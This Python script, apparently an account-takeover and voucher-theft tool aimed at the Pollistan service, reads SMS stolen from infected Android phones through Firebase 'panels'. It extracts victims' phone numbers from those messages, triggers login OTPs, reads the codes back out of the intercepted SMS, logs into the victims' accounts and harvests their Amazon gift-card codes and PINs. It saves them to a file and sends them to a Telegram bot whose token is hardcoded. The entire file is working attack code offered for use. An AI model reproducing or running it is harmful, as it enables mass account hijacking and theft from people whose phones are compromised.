#!/usr/bin/env python3
"""
Pollistan Auto-Redeemer — Firebase OTP + Parallel Workers + Flask Server + Telegram Notification
"""

import requests
import base64
import re
import sys
import os
import time
import random
import threading
import queue
import argparse
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask

# ─────────────────────────────────────────────
# TELEGRAM BOT CONFIG
# ─────────────────────────────────────────────
BOT_TOKEN = "8876082662:AAG5mw5h8Pim7V236Xnk0MJt-lEv_RWOuAU"
# Apni Chat ID ya Channel ID yahan daalein (e.g. 123456789 ya "@yourchannel")
CHAT_ID   = ""  

def send_telegram_message(message):
    """Send text notification to Telegram bot/channel."""
    if not CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        log(f"  [ERR] Telegram send failed: {e}")

# ─────────────────────────────────────────────
# FLASK WEB SERVER (FOR RENDER DEPLOYMENT)
# ─────────────────────────────────────────────
app = Flask(__name__)

@app.route('/')
def home():
    return "Pollistan Bot is running live on Render!"

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ─────────────────────────────────────────────
# CREDIT
# ─────────────────────────────────────────────
YOUR_NAME         = "BLANK"

# ─────────────────────────────────────────────
# WINDOWS UTF-8 FIX
# ─────────────────────────────────────────────
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    try:
        import io
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")
    except Exception:
        pass

# ─────────────────────────────────────────────
# ANSI COLOR HELPERS
# ─────────────────────────────────────────────
def _enable_windows_ansi():
    if os.name != "nt":
        return True
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)
        mode = ctypes.c_uint32()
        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            return False
        return bool(kernel32.SetConsoleMode(handle, mode.value | 0x0004))
    except Exception:
        return False

COLOR_SUPPORTED = _enable_windows_ansi() and (
    hasattr(sys.stdout, "isatty") and sys.stdout.isatty() or os.name != "nt"
)

RST      = "\033[0m"   if COLOR_SUPPORTED else ""
BOLD     = "\033[1m"   if COLOR_SUPPORTED else ""
DIM      = "\033[2m"   if COLOR_SUPPORTED else ""
CYAN     = "\033[96m"  if COLOR_SUPPORTED else ""
YELLOW   = "\033[93m"  if COLOR_SUPPORTED else ""
MAGENTA  = "\033[95m"  if COLOR_SUPPORTED else ""
GREEN    = "\033[92m"  if COLOR_SUPPORTED else ""
BG_CYAN  = "\033[46m"  if COLOR_SUPPORTED else ""
BG_BLACK = "\033[40m"  if COLOR_SUPPORTED else ""

def credit_line():
    return (
        f"{YELLOW}{BOLD}  👑  Made by : "
        f"{BG_CYAN}{BG_BLACK}{CYAN}{BOLD} {YOUR_NAME} {RST}"
    )

def credit_footer():
    return (
        f"{YELLOW}{BOLD}  👑  Script by : "
        f"{MAGENTA}{BOLD} {YOUR_NAME} {RST}"
    )

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
API_BASE          = "https://api.pollistan.com/api/v1"
OTP_POLL_INTERVAL = 3
OTP_MAX_ATTEMPTS  = 15
DEFAULT_WORKERS   = 50
MAX_WORKERS       = 100
FIREBASE_FILE     = "l.txt"
VOUCHER_FILE      = "vouchers.txt"
FAILED_FILE       = "failed.txt"
TIMEOUT           = 20

FIRST_NAMES = [
    "Rahul","Priya","Amit","Sneha","Vikram","Pooja","Arjun","Neha",
    "Rohit","Anjali","Karan","Divya","Siddharth","Riya","Aakash",
    "Shreya","Manish","Kavya","Nikhil","Simran","Deepak","Meera",
]
LAST_NAMES = [
    "Sharma","Verma","Gupta","Singh","Kumar","Patel","Shah","Joshi",
    "Mehta","Yadav","Tiwari","Mishra","Pandey","Agarwal","Malhotra",
]

def random_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

# ─────────────────────────────────────────────
# GLOBALS
# ─────────────────────────────────────────────
print_lock   = threading.Lock()
voucher_lock = threading.Lock()
failed_lock  = threading.Lock()
stats        = {"ok": 0, "fail": 0, "total": 0}
stats_lock   = threading.Lock()

def log(msg):
    with print_lock:
        try:
            print(msg)
        except Exception:
            print(msg.encode("ascii", "replace").decode("ascii"))

# ─────────────────────────────────────────────
# FIREBASE HELPERS
# ─────────────────────────────────────────────
def parse_firebase_link(link):
    link = link.strip()
    if link.startswith(("http://","https://")) and (
        "firebaseio.com" in link or "firebasedatabase.app" in link
    ):
        return link.rstrip("/") + "/"
    parsed = urlparse(link)
    qs = parse_qs(parsed.query)
    encoded = qs.get("s",[None])[0]
    if not encoded:
        return None
    try:
        encoded += "=" * (-len(encoded) % 4)
        decoded = base64.b64decode(encoded).decode("utf-8").split("|")[0].strip()
        if "firebaseio.com" not in decoded and "firebasedatabase.app" not in decoded:
            return None
        return decoded.rstrip("/") + "/"
    except Exception:
        return None

def is_online_device(data):
    if not isinstance(data, dict):
        return False
    for key in ("status","state","online","isOnline","connected","isConnected"):
        value = data.get(key)
        if value is True or value == 1:
            return True
        if isinstance(value, str) and value.strip().lower() in {
            "true","online","connected","active","ready"
        }:
            return True
    return False

def extract_phone_from_messages(device_messages):
    patterns = [
        (re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"), 10),
        (re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE), 15),
        (re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"), 5),
    ]
    counts = {}
    for msg in device_messages.values():
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
        for pattern, score in patterns:
            for number in pattern.findall(text):
                counts[number] = counts.get(number, 0) + score
    if not counts:
        return None
    return max(counts, key=counts.get)

def extract_otp_from_messages(device_messages, trigger_time_ms):
    for msg_id in reversed(list(device_messages.keys())):
        msg_data = device_messages[msg_id]
        if not isinstance(msg_data, dict):
            continue
        try:
            if int(msg_id) < (trigger_time_ms - 30000):
                continue
        except Exception:
            pass
        body = (
            msg_data.get("body") or msg_data.get("message") or
            msg_data.get("text") or msg_data.get("sms") or ""
        )
        match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
        if match:
            return match.group(0)
    return None

def fetch_devices_and_phones(firebase_url):
    try:
        c = requests.get(f"{firebase_url.rstrip('/')}/clients.json", timeout=TIMEOUT)
        c.raise_for_status()
        clients = c.json() or {}
        m = requests.get(f"{firebase_url.rstrip('/')}/messages.json", timeout=TIMEOUT)
        m.raise_for_status()
        messages = m.json() or {}
    except Exception as e:
        log(f"  [WARN] Firebase: {e}")
        return []
    if not isinstance(clients, dict):
        return []
    online = [cid for cid, cdata in clients.items() if is_online_device(cdata)]
    result = []
    seen = set()
    for cid in online:
        dev_msgs = messages.get(str(cid), {}) if isinstance(messages, dict) else {}
        phone = extract_phone_from_messages(dev_msgs)
        if phone and phone not in seen:
            seen.add(phone)
            result.append({"client_id": cid, "phone": phone})
    return result

def poll_for_otp(firebase_url, client_id, trigger_time_ms):
    for _ in range(OTP_MAX_ATTEMPTS):
        time.sleep(OTP_POLL_INTERVAL)
        try:
            r = requests.get(
                f"{firebase_url}messages/{client_id}.json", timeout=TIMEOUT
            )
            msgs = r.json()
            if not isinstance(msgs, dict):
                continue
            otp = extract_otp_from_messages(msgs, trigger_time_ms)
            if otp:
                return otp
        except Exception:
            continue
    return None

# ─────────────────────────────────────────────
# POLLISTAN API
# ─────────────────────────────────────────────
def build_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36"
        ),
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://pollistan.com",
        "Referer": "https://pollistan.com/",
        "ngrok-skip-browser-warning": "true",
        "sec-ch-ua-platform": "Android",
        "sec-ch-ua-mobile": "?1",
    })
    return s

def send_otp(session, phone):
    try:
        r = session.post(
            f"{API_BASE}/auth/send-otp",
            json={"mobileNumber": f"+91{phone}"},
            timeout=TIMEOUT
        )
        if r.status_code in (200, 201):
            return True
        if r.status_code == 400:
            return True
    except Exception as e:
        log(f"  [ERR] send-otp: {e}")
    return False

def verify_otp(session, phone, otp):
    try:
        r = session.post(
            f"{API_BASE}/auth/verify-otp",
            json={"mobileNumber": f"+91{phone}", "otp": otp},
            timeout=TIMEOUT
        )
        if r.status_code in (200, 201):
            data = r.json()
            token = data.get("token") or data.get("accessToken") or ""
            if token:
                session.headers.update({"Authorization": f"Bearer {token}"})
                return True, data
    except Exception as e:
        log(f"  [ERR] verify-otp: {e}")
    return False, {}

def get_gift_card_list(session):
    try:
        r = session.get(
            f"{API_BASE}/gift-cards/my",
            params={"active": "true", "cursor": "", "pageSize": 20},
            timeout=TIMEOUT
        )
        if r.status_code == 200:
            data = r.json()
            purchases = []
            if isinstance(data, list):
                purchases = data
            elif isinstance(data, dict):
                purchases = (
                    data.get("purchases") or data.get("data") or
                    data.get("items") or data.get("giftCards") or []
                )
            return purchases
    except Exception as e:
        log(f"  [ERR] gift-card list: {e}")
    return []

def get_voucher_detail(session, purchase_id):
    try:
        r = session.get(
            f"{API_BASE}/gift-cards/purchases/{purchase_id}",
            timeout=TIMEOUT
        )
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        log(f"  [ERR] voucher detail: {e}")
    return {}

def get_amazon_voucher(session, verify_response):
    signup = verify_response.get("signupVoucher") or {}
    if signup:
        pass

    purchases = get_gift_card_list(session)
    for item in purchases:
        if not isinstance(item, dict):
            continue
        brand = str(item.get("brandName") or item.get("brand") or "").lower()
        status = str(item.get("status") or "").upper()
        purchase_id = item.get("purchaseId") or item.get("id") or item.get("_id")

        if "amazon" in brand and status == "SUCCESS" and purchase_id:
            detail = get_voucher_detail(session, purchase_id)
            voucher_code = (
                detail.get("voucherCode") or detail.get("code") or
                detail.get("cardNumber") or ""
            )
            voucher_pin = (
                detail.get("voucherPin") or detail.get("pin") or
                detail.get("claimCode") or ""
            )
            amount_paise = detail.get("denominationPaise") or item.get("denominationPaise") or 0
            try:
                amount_rs = int(amount_paise) // 100
            except Exception:
                amount_rs = 0
            if voucher_code:
                return voucher_code, voucher_pin, amount_rs

    return None, None, 0

# ─────────────────────────────────────────────
# SAVE & NOTIFY
# ─────────────────────────────────────────────
def save_voucher(phone, code, pin, amount):
    line = f"{phone} | {code} | {pin} | ₹{amount}\n"
    with voucher_lock:
        with open(VOUCHER_FILE, "a", encoding="utf-8") as f:
            f.write(line)
            
    log(f"\n{'='*55}")
    log(f"  🎁  VOUCHER!")
    log(f"  📱  Phone   : {phone}")
    log(f"  🎫  Code    : {code}")
    log(f"  🔑  PIN     : {pin}")
    log(f"  💰  Amount  : ₹{amount}")
    log(f"{'='*55}\n")

    # Telegram Notification Format
    tg_text = (
        f"<b>🎁 New Voucher Redeemed!</b>\n\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🎫 <b>Code:</b> <code>{code}</code>\n"
        f"🔑 <b>PIN:</b> <code>{pin}</code>\n"
        f"💰 <b>Amount:</b> ₹{amount}"
    )
    send_telegram_message(tg_text)

def save_failed(phone, reason):
    with failed_lock:
        with open(FAILED_FILE, "a", encoding="utf-8") as f:
            f.write(f"{phone} | {reason}\n")

# ─────────────────────────────────────────────
# WORKER
# ─────────────────────────────────────────────
def process_number(phone, firebase_url, client_id):
    session = build_session()
    with stats_lock:
        stats["total"] += 1

    log(f"[→] {phone}")

    trigger_ms = int(time.time() * 1000)
    if not send_otp(session, phone):
        log(f"[✗] {phone} — send-otp failed")
        save_failed(phone, "send_otp_failed")
        with stats_lock: stats["fail"] += 1
        return False

    otp = poll_for_otp(firebase_url, client_id, trigger_ms)
    if not otp:
        log(f"[✗] {phone} — OTP timeout")
        save_failed(phone, "otp_timeout")
        with stats_lock: stats["fail"] += 1
        return False

    log(f"  [{phone}] OTP: {otp}")

    ok, verify_resp = verify_otp(session, phone, otp)
    if not ok:
        log(f"[✗] {phone} — verify failed")
        save_failed(phone, "verify_failed")
        with stats_lock: stats["fail"] += 1
        return False

    log(f"  [{phone}] Verified ✓")

    time.sleep(1)
    code, pin, amount = get_amazon_voucher(session, verify_resp)

    if not code:
        log(f"[✗] {phone} — no voucher")
        save_failed(phone, "no_voucher")
        with stats_lock: stats["fail"] += 1
        return False

    save_voucher(phone, code, pin or "N/A", amount)
    with stats_lock: stats["ok"] += 1
    return True

# ─────────────────────────────────────────────
# MAIN AUTOMATION TASK
# ─────────────────────────────────────────────
def run_automation():
    workers = DEFAULT_WORKERS

    if not os.path.exists(FIREBASE_FILE):
        print(f"[ERROR] {FIREBASE_FILE} not found!")
        return

    for fpath, header in [
        (VOUCHER_FILE, "# phone | voucherCode | voucherPin | amount\n\n"),
        (FAILED_FILE,  "# phone | reason\n\n"),
    ]:
        if not os.path.exists(fpath):
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(header)

    print("=" * 55)
    print(credit_line())
    print("=" * 55)
    print("  POLLISTAN AUTO-REDEEMER")
    print(f"  API     : {API_BASE}")
    print(f"  Panels  : {FIREBASE_FILE}")
    print(f"  Workers : {workers} / {MAX_WORKERS} max")
    print(f"  Time    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 55)

    with open(FIREBASE_FILE, encoding="utf-8") as f:
        raw = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    panel_urls = []
    for line in raw:
        url = parse_firebase_link(line.split("|")[0].strip())
        if url:
            panel_urls.append(url)

    if not panel_urls:
        print("[ERROR] No valid Firebase URLs.")
        return

    print(f"\nScanning {len(panel_urls)} Firebase panels...")
    all_jobs = []
    for i, fb_url in enumerate(panel_urls, 1):
        log(f"Panel {i}/{len(panel_urls)}: {fb_url}")
        devices = fetch_devices_and_phones(fb_url)
        if not devices:
            log("  [skip] no online devices")
            continue
        log(f"  → {len(devices)} online")
        for dev in devices:
            all_jobs.append((dev["phone"], fb_url, dev["client_id"]))

    if not all_jobs:
        print("No numbers to process.")
        return

    print(f"\nTotal numbers : {len(all_jobs)}")
    print(f"Workers       : {workers}\n")

    start = time.time()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {
            ex.submit(process_number, phone, fb, cid): phone
            for phone, fb, cid in all_jobs
        }
        done = 0
        for future in as_completed(futures):
            done += 1
            try:
                future.result()
            except Exception as e:
                log(f"[CRASH] {futures[future]}: {e}")
                with stats_lock: stats["fail"] += 1
            with stats_lock:
                log(f"  Progress: {done}/{len(all_jobs)} | ✅{stats['ok']} ❌{stats['fail']}")

    elapsed = round(time.time() - start, 1)
    print(f"\n{'='*55}")
    print(f"  DONE ({elapsed}s)")
    print(f"  ✅ Vouchers : {stats['ok']}")
    print(f"  ❌ Failed   : {stats['fail']}")
    print(f"  💾 {VOUCHER_FILE}")
    print(f"  💾 {FAILED_FILE}")
    print(f"{'='*55}")
    print(credit_footer())
    print(f"{'='*55}")

if __name__ == "__main__":
    task_thread = threading.Thread(target=run_automation)
    task_thread.daemon = True
    task_thread.start()

    run_flask()

